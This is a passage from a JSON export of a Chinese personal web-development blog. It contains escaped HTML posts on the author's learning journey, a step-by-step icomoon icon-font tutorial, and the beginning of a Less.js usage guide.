16px;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;但我还是热爱着现在所做的事情, 也许在别人眼中, 俺只是个写网页的\u003cimg src=\"http://img.baidu.com/hi/jx2/j_0074.gif\" width=\"21\" height=\"22\" style=\"width: 21px; height: 22px;\"/\u003e. 但我要说No,,,\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u003cspan style=\"font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(29, 27, 16);\"\u003eI am web developer ! \u0026nbsp; \u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 12px;\"\u003e(这个x装的有点过)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(29, 27, 16); font-size: 16px;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;第一次是从Larry Ullman的那本经典的\u0026lt;PHP基础教程\u0026gt;了解了web编程, 也算我整个web生涯的起点吧, 他的每一本有中文翻译的著作我都看过. 虽然说他没有回复过我的邮件, 但\u003cspan style=\"font-size: 16px; color: rgb(12, 12, 12); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 24px;\"\u003e我很感谢Larry.\u003c/span\u003e\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 24px; color: rgb(29, 27, 16); font-size: 16px;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;后来应该是学的比较杂, 比较乱. 直到遇到一本 爱飞翔翻译的\u0026lt;JavaScript应用开发实践指南\u0026gt;(我不是打广告啊),这本书其实并不涉及实际开发项目, 反而是一本学习Js以及一些编程规范的入门级好书. 后来我也了解了一下爱飞翔, 他的翻译朴实无华, 简单易懂却又在恰当的时候给你一点幽默. 可惜我没有电子版, 所以建议大家去校图书馆借看一看.(推荐新手看, 因为这本书比较入门)\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 24px; color: rgb(29, 27, 16); font-size: 16px;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;后来也看了不少书, 但基本没什么亮点. 直到Nicholas C.Zakas的那本业界经典 \u0026lt;Javascript高级程序设计第三版\u0026gt;, 简称红皮书. 如果这本书你没看过, 是一定要看的. 就算你是一位高手, 也应该看看, 这是与行业大牛交流的机会.\u0026nbsp;\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 24px; color: rgb(29, 27, 16); font-size: 16px;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;NCZ还是蛮帅的(Github上面以前戴帽子的那个头像)\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 24px; color: rgb(29, 27, 16); font-size: 16px;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;我也曾给他发过邮件, 不过也没有回复...\u0026nbsp;\u003cimg src=\"http://img.baidu.com/hi/jx2/j_0064.gif\" width=\"18\" height=\"19\" style=\"width: 18px; height: 19px;\"/\u003e \u0026nbsp;(大牛总是很忙的了) 不过Github上面问过几个问题, 他都回复了, 还是很友好的一个人吧.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 24px; color: rgb(29, 27, 16); font-size: 16px;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;再后来的话, 看的语言书籍就比较少了. 开始尝试去了解一些框架, 一些好的编程实践. 比如说seajs的前端模块化, angularjs的前端MVC开发框架, 认识了angular之后才知道世界上竟会有如此神奇的工具, 成倍提高你开发的速度, 下面是官方对angular的介绍.\u003c/span\u003e\u003cspan style=\"font-size: 16px; color: rgb(12, 12, 12); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 24px;\"\u003e\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cblockquote\u003e\u003cp dir=\"ltr\" style=\"line-height: 1.5em; text-indent: 0em;\"\u003e\u003cspan style=\"line-height: 24px; font-size: 12px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; color: rgb(63, 63, 63); text-decoration: none; background-color: rgb(191, 191, 191);\"\u003e我们中有个叫Misko Hevery的小伙子, 他说要用自己业余时间做的一个框架和俩个星期的时间完成我们一个17000行代码的前端项目, 然而他failed. 他花了三个星期, 但是却让项目的代码缩减到了1,500行.\u003c/span\u003e\u003c/p\u003e\u003c/blockquote\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 24px; color: rgb(29, 27, 16);\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 24px; color: rgb(29, 27, 16); font-size: 16px;\"\u003e\u0026nbsp;对了, 还有自己的老本行PHP, 在业余的时间也了解了一下Yii, 并且把自己的博客完全用Yii改版.但是现在我的博客又基本用不到Yii了, 因为前几个星期我把博客的数据全部迁移到了Parse云上面, 这是facebook提供的Baas(Backend as a service)服务.它提供的免费服务已经完全满足我这种小开发者的需求了..\u003cbr/\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 24px; color: rgb(29, 27, 16); font-size: 16px;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;还有, 咖啡要少喝哦, 喝多了晚上容易睡不着.\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 2em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 24px; color: rgb(29, 27, 16); font-size: 16px;\"\u003e本文资源 (下面都是我看过的认为\u003c/span\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 24px; color: rgb(29, 27, 16); font-size: 16px; text-decoration: underline;\"\u003e很好\u003c/span\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 24px; color: rgb(29, 27, 16); font-size: 16px;\"\u003e的书的电子版) : \u0026nbsp;\u003c/span\u003e\u003cspan style=\"font-size: 16px; color: rgb(12, 12, 12); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; line-height: 24px;\"\u003e\u003cimg src=\"http://img.baidu.com/hi/jx2/j_0029.gif\" style=\"float: right;\"/\u003e\u003c/span\u003e\u003c/p\u003e\u003col class=\" list-paddingleft-2\" style=\"list-style-type: decimal;\"\u003e\u003cli\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003ca href=\"http://7fdd1f.l41.yunpan.cn/lk/cFiMmC7HTDEAf\" target=\"_blank\"\u003eJs高级程序设计 NCZ 下载\u003c/a\u003e\u0026nbsp;\u003ca href=\"http://7fdd1f.l41.yunpan.cn/lk/cFiMmC7HTDEAf\" target=\"_blank\" style=\"text-decoration: none; color: rgb(102, 102, 102); font-family: \u0026#39;Microsoft Yahei\u0026#39;; font-size: 14px; line-height: 21px; white-space: normal; background-color: rgb(255, 255, 255);\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e(提取码 : a398)\u003c/span\u003e\u003c/a\u003e\u003c/span\u003e\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003ca href=\"http://yunpan.cn/cFiMSTfBYLn7A\" target=\"_blank\"\u003eHTML5 canvas核心技术 图形 动画与游戏开发\u003c/a\u003e\u0026nbsp;\u003ca href=\"http://yunpan.cn/cFiMSTfBYLn7A\" target=\"_blank\" style=\"text-decoration: none; color: rgb(102, 102, 102); font-family: \u0026#39;Microsoft Yahei\u0026#39;; font-size: 14px; line-height: 21px; white-space: normal; background-color: rgb(255, 255, 255);\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e(提取码 : a257)\u003c/span\u003e\u003c/a\u003e\u003c/span\u003e\u003c/p\u003e\u003c/li\u003e\u003cli\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003ca href=\"http://yunpan.cn/cFikKyvxLtad3\" target=\"_blank\"\u003e[PHP基础教程（第4版）].(Larry.Ullman).\u003c/a\u003e\u0026nbsp;\u003ca href=\"http://yunpan.cn/cFikKyvxLtad3\" target=\"_blank\" style=\"text-decoration: none; color: rgb(102, 102, 102); font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 14px; line-height: 21px; white-space: normal; background-color: rgb(255, 255, 255);\"\u003e(提取码 : 59cd)\u003c/a\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003ca href=\"http://yunpan.cn/cFikKyvxLtad3\" target=\"_blank\"\u003e\u003c/a\u003e\u003c/span\u003e\u003c/p\u003e\u003c/li\u003e\u003cbr/\u003e\u003c/ol\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20151101/1446380178725946.png\" title=\"1446380178725946.png\" alt=\"QQ截图20151101183553.png\" width=\"679\" height=\"260\" style=\"width: 679px; height: 260px;\"/\u003e\u003c/p\u003e",
        "hasContent": false,
        "is_delete": false,
        "objectId": "CVs8Gke5Uy",
        "stamps": "生活,学习",
        "title": "Github的第一百天",
        "types": "b5e",
        "updatedAt": "2015-12-05T03:28:19.799Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "\u003cp\u003e首先我们需要制作图标字体（即ttf，eot等文件），制作的方法十分简单，推荐一个国外的网站\u003c/p\u003e\u003cp\u003e\u003ca href=\"https://icomoon.io/\" target=\"_blank\"\u003e制作Icon Font的网站\u003c/a\u003e\u003cbr/\u003e\u003c/p\u003e\u003cp\u003e好的，为了方便大家上手，我来说说怎么使用这个网站。\u003c/p\u003e\u003col class=\" list-paddingleft-2\" style=\"list-style-type: decimal;\"\u003e\u003cli\u003e\u003cp style=\"line-height: 1.5em;\"\u003e第一步：注册，如果你有账号就先登录\u003cbr/\u003e\u003c/p\u003e\u003c/li\u003e\u003c/ol\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150802/1438475991778875.png\" title=\"1438475991778875.png\" alt=\"blob.png\"/\u003e\u003cbr/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e2. 第二步：注册并登陆成功后，点击这个按钮，进入图标制作页面\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150802/1438476106107644.png\" title=\"1438476106107644.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e3. 第三步：点击左上角的这个（管理自己的projects）\u003cbr/\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150802/1438476176711100.png\" title=\"1438476176711100.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e4. 第四步：我们可以选择导入project也可以新建project。这里选择新建（导入稍后再说）\u003c/p\u003e\u003cp\u003e这里系统可能给你初始化了一个空的project，木有关系，我们还是新建一个。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150802/1438476303975315.png\" title=\"1438476303975315.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e5. 第五步：新建成功，当然就是load载入工程了。如果喜欢，你也可以给项目一个好听的名字。\u003cbr/\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150802/1438476402888821.png\" title=\"1438476402888821.png\" alt=\"blob.png\" width=\"590\" height=\"64\" style=\"width: 590px; height: 64px;\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e6. 第六步：工程载入后，看到下面的页面。这里我们添加图标。icomoon网站自带了500+个\u003c/p\u003e\u003cp\u003e免费图标，还有一些收费的。但我不建议用收费的，后面我会推荐另一个图标库，我们从那里获取图标，然后到这里制作图标字体。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150802/1438476469128084.png\" title=\"1438476469128084.png\" alt=\"blob.png\" width=\"648\" height=\"180\" style=\"width: 648px; height: 180px;\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e7. 第七步：点击add icons From library后出现一个图标选择的页面，为什么分这么多卡片让你选择呢？因为不同的设计者开发的图标在风格上会不一样，icomoon会把同一来源的图标放在一起，便于开发者管理。好吧，这里我们就随便add一个免费的。。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150802/1438476728173547.png\" title=\"1438476728173547.png\" alt=\"blob.png\" width=\"634\" height=\"336\" style=\"width: 634px; height: 336px;\"/\u003e\u003c/p\u003e\u003cp\u003e8. 第八步：图标太多了\u003cimg src=\"http://img.baidu.com/hi/face/i_f02.gif\"/\u003e，先点箭头，再选择自己喜欢的图标。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150802/1438477079287796.png\" title=\"1438477079287796.png\" alt=\"blob.png\" width=\"660\" height=\"171\" style=\"width: 660px; height: 171px;\"/\u003e\u003c/p\u003e\u003cp\u003e9.第九步：这里我们乱入一下，如果这些图标都木有我想要的怎么办？好的，我们看看最牛b的网站来了。。进入这个网站\u003ca href=\"http://www.iconfont.cn/\" target=\"_blank\"\u003e阿里巴巴矢量图标库\u003c/a\u003e，这个网站不需要注册就能用，其实它最牛b有三个地方。第一：图标多；第二：搜索功能强大；第三：免费。我们尝试搜索 ： code\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150802/1438477444620174.png\" title=\"1438477444620174.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp\u003e10.第十步：居然给了我122个图标，3Q。我喜欢右下角的那个，下载一下。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150802/1438477503111994.png\" title=\"1438477503111994.png\" alt=\"blob.png\" width=\"568\" height=\"169\" style=\"width: 568px; height: 169px;\"/\u003e\u003c/p\u003e\u003cp\u003e11.第11步：选择下载svg，别选错了哦。ai格式是illustrate软件打开编辑的源文件，相当于photoshop的psd文件，png是给你做图片图标用的。（就是那种一张图片放几十个图标的png图）\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150802/1438477738555884.png\" title=\"1438477738555884.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp\u003e12.第12步 ：返回icomoon网站点击import icons。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150802/1438477874758908.png\" title=\"1438477874758908.png\" alt=\"blob.png\" width=\"516\" height=\"374\" style=\"width: 516px; height: 374px;\"/\u003e\u003c/p\u003e\u003cp\u003e13.第13步：hey，是不是出来了，记得要选择它哦，没选择的话背景是灰色的。而且icomoon会自动把你添加的图标分为一组，便于管理。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150802/1438477945860648.png\" title=\"1438477945860648.png\" alt=\"blob.png\" width=\"264\" height=\"195\" style=\"width: 264px; height: 195px;\"/\u003e\u003c/p\u003e\u003cp\u003e14.第14步：好的，现在图标我们都准备好了，接下来就是生成图标库了！！\u003c/p\u003e\u003cp\u003e点击右下角的\u003cbr/\u003e\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150802/1438478111829652.png\" title=\"1438478111829652.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp\u003e点击后变成\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150802/1438478164289776.png\" title=\"1438478164289776.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp\u003e你可以直接download，也可以点击设置按钮（是的，就是那个齿轮），修改一些配置。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150802/1438478499842562.png\" title=\"1438478499842562.png\" alt=\"blob.png\" width=\"478\" height=\"264\" style=\"width: 478px; height: 264px;\"/\u003e\u003c/p\u003e\u003cp\u003e15. 第15步，现在下载吧，解压后就是这样，如果你勾选了IE6,7，那还应该有个IE文件夹。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150802/1438478743147082.png\" title=\"1438478743147082.png\" alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e16.第十六步，这里我们已经基本完成了，打开demo.html你就会看到具体怎么使用字体图标来设置字体了。\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e真实的配置和生产环境中，我们只需要fonts文件夹和style.css，如果你选择兼容IE，那么还有一个IE文件夹也是需要的。我来说说\u003cstrong\u003eselection.json\u003c/strong\u003e是干什么的，\u003cstrong\u003e这个很重要！\u003c/strong\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e如果你现在想添加图标怎么办？如果icomoon网站还没被你关闭的话，你还可以像刚才说的那样import icons ，但是如果关闭的话。你的工程项目就木有了。icomoon不会保存你的工程，因为这项服务是要收费的\u003cimg src=\"http://img.baidu.com/hi/face/i_f08.gif\"/\u003e。不过没关系，icomoon很人性化的给你\u003cstrong style=\"white-space: normal;\"\u003eselection.json\u003c/strong\u003e就是你的工程的配置文件。\u003c/p\u003e\u003cp\u003e还记得第四部我说的吗？可以导入工程！（原图借用一下，忽略箭头）选择import project\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150802/1438476303975315.png\" title=\"1438476303975315.png\" alt=\"blob.png\" style=\"white-space: normal;\"/\u003e\u003c/p\u003e\u003cp\u003e17.第17步：导入已有的工程，如果网站还没被你关闭，导入工程是看不到效果的，因为工程就在那里。。。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150802/1438479348577314.png\" title=\"1438479348577314.png\" alt=\"blob.png\" width=\"673\" height=\"40\" style=\"width: 673px; height: 40px;\"/\u003e\u003c/p\u003e\u003cp\u003e模拟情景：一个月后，我觉得图标字库不够用了，好的，来导入工程，load一下。。\u003c/p\u003e\u003cp\u003e\u003cimg src=\"/ueditor/php/upload/image/20150802/1438479461409232.png\" title=\"1438479461409232.png\" alt=\"blob.png\" width=\"481\" height=\"200\" style=\"width: 481px; height: 200px;\"/\u003e\u003c/p\u003e\u003cp\u003e哇塞，我又可以添加字体了！\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e后话：本来说是制作图标字库与使用俩个教程，但想想使用还是很简单的，而且icomoon提供下载的压缩包里面的demo.html 演示的十分完美，如何使用我相信大家身为前端开发工程师是不会有问题的。\u003cimg src=\"http://img.baidu.com/hi/face/i_f01.gif\"/\u003e\u003c/p\u003e",
        "createdAt": "2015-10-16T09:26:11.455Z",
        "date_entered": {
            "__type": "Date",
            "iso": "2015-08-02T14:42:00.000Z"
        },
        "desc": "\u003cp style=\\\"line-height: 1.5em;\\\"\u003e图标字体就是把图标放到字体文件中（如ttf，eot等），然后在css中自定义字体就可以了。\u003c/p\u003e\u003cp\n        style=\\\"line-height: 1.5em;\\\"\u003e字体图标的优势：\u003cbr/\u003e\u003c/p\u003e\n\u003col class=\\\" list-paddingleft-2\\\" style=\\\"list-style-type: decimal;\\\"\u003e\n\u003cli\u003e\u003cp style=\\\"line-height: 1.5em;\\\"\u003e完美兼容IE8+与其它主流浏览器，对于IE8一下有兼容方法，不需要我们细细研究。\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp style=\\\"line-height: 1.5em;\\\"\u003e用css的color，font-size等等就可以修改字体图标的颜色，大小等等。\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp style=\\\"line-height: 1.5em;\\\"\u003e等等...\u003cbr/\u003e\u003c/p\u003e\u003c/li\u003e\u003c/ol\u003e\u003cp style=\\\"line-height: 1.5em;\\\"\u003e\u003cbr/\u003e\u003c/p\u003e\u003cp\n        style=\\\"line-height: 1.5em;\\\"\u003e我们先看看ele.me的例子：\u003c/p\u003e\u003cp style=\\\"line-height: 1.5em;\\\"\u003e\u003cimg\n        src=\"/ueditor/php/upload/image/20150802/1438475475126526.png\" title=\\\"1438475475126526.png\\\"\n        alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp style=\\\"line-height: 1.5em;\\\"\u003e再看看淘宝的。。\u003c/p\u003e\u003cp style=\\\"line-height: 1.5em;\\\"\u003e\u003cimg\n        src=\"/ueditor/php/upload/image/20150802/1438475095118789.png\" title=\\\"1438475095118789.png\\\"\n        alt=\"blob.png\"/\u003e\u003c/p\u003e\u003cp\n        style=\\\"line-height: 1.5em;\\\"\u003e俩个网站都是用图标字体，但是eleme使用的方式是伪元素:before，taobao使用的是实体。taobao的做法可以完美兼容IE6,7。eleme的方法也行，只不过要在判断是IE6,7的时候引入另一个css文件。\u003c/p\u003e\n\u003cp\u003e我们来看看具体怎么做字体图标库。（多图，谨慎点击）\u003c/p\u003e",
        "objectId": "L7PbN202Yz",
        "stamps": "css,图标字体",
        "title": "Web图标字体制作教程",
        "types": "b1e,b12e",
        "updatedAt": "2015-10-31T02:36:59.366Z"
    },
	{
        "ACL": {
            "*": {
                "read": true
            },
            "kj2g755V2F": {
                "read": true,
                "write": true
            }
        },
        "content": "\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e内容分俩部分:\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e1. 相关的概念解释\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e2. 实际使用与常用语法\u0026nbsp;\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 12px;\"\u003e(结合我自己的实际项目, 只说最常用最核心的功能,贪多嚼不烂)\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cstrong\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px;\"\u003e$. 概念解释\u003c/span\u003e\u003c/strong\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;; font-size: 16px;\"\u003e\u003cbr/\u003e\u003c/span\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003esimpless是一款less代码编译软件,没错,是windows软件.就是下图:\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cimg src=\"/ueditor/php/upload/image/20151003/1443865508151773.png\" title=\"1443865508151773.png\" alt=\"blob.png\" width=\"370\" height=\"207\" style=\"width: 370px; height: 207px;\"/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003c/span\u003e\u003c/p\u003e\u003chr/\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"line-height: 1.5em; font-size: 16px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003eLess.js 就是我们所说的less. 如果你深入的了解就会发现这个Less.js还分为客户端和服务端俩种使用方式. (注意 : 俩种环境下的Js代码并不一样!)\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-size: 12px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e服务端用法其实是: Less.js作为Nodejs的一个模块被调用, 然后把Less文件编译成浏览器可执行的css文件(如果你不懂Nodejs, 木有关系这里不讨论这个). \u0026nbsp;\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-size: 12px; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003c/span\u003e\u003c/p\u003e\u003chr/\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-size: 12px; line-height: 1.5em; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e客户端用法是: 在引用less文件后引入less.js, 形如:\u003c/span\u003e\u003c/p\u003e\u003cpre class=\"brush:html;toolbar:false\"\u003e\u0026lt;link\u0026nbsp;rel=\u0026quot;stylesheet/less\u0026quot;\u0026nbsp;type=\u0026quot;text/css\u0026quot;\u0026nbsp;href=\u0026quot;styles.less\u0026quot;\u0026nbsp;/\u0026gt;\n\u0026lt;script\u0026nbsp;src=\u0026quot;less.js\u0026quot;\u0026nbsp;type=\u0026quot;text/javascript\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\u003c/pre\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e这样,每次浏览器刷新的时候,lessjs就会编译相应的less文件成css并注入到HTML中.但这地方有俩点要注意一下. 第一: 实际项目中不会这么做, 因为这个要浏览器临时编译less, 那我为什么不先编译好然后直接传输css文件给浏览器呢,而且还不用再引入less.js \u0026nbsp;第二: 这个less.js和上面的服务端less.js不是同一个文件哦,一个是Js在服务端的实现,另一个是在浏览器端的实现,虽然都是Js代码, 但是语法稍有不同.\u003c/span\u003e\u003cbr/\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003c/span\u003e\u003c/p\u003e\u003chr/\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cstrong\u003e$.实际使用\u003c/strong\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e刚才上面说到的俩种方式就是前俩种使用less的方法.不过...\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;第一种方法稍微复杂一些, 需要你安装Nodejs,以及node的一些常规使用方法.(适合Geek, 不过在下有一言: 如果你爱Js, 那你就躲不了Nodejs, 尽快爱上它吧)\u0026nbsp;\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"line-height: 1.5em; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e如果你安装了Nodejs, 却不想用第一种方法, 请跳到最后一种方法.\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan style=\"line-height: 1.5em; font-family: 微软雅黑, \u0026#39;Microsoft YaHei\u0026#39;;\"\u003e\u003cbr/\u003e\u003c/span\u003e\u003c/p\u003e\u003cp style=\"line-height: 1.5em;\"\u003e\u003cspan 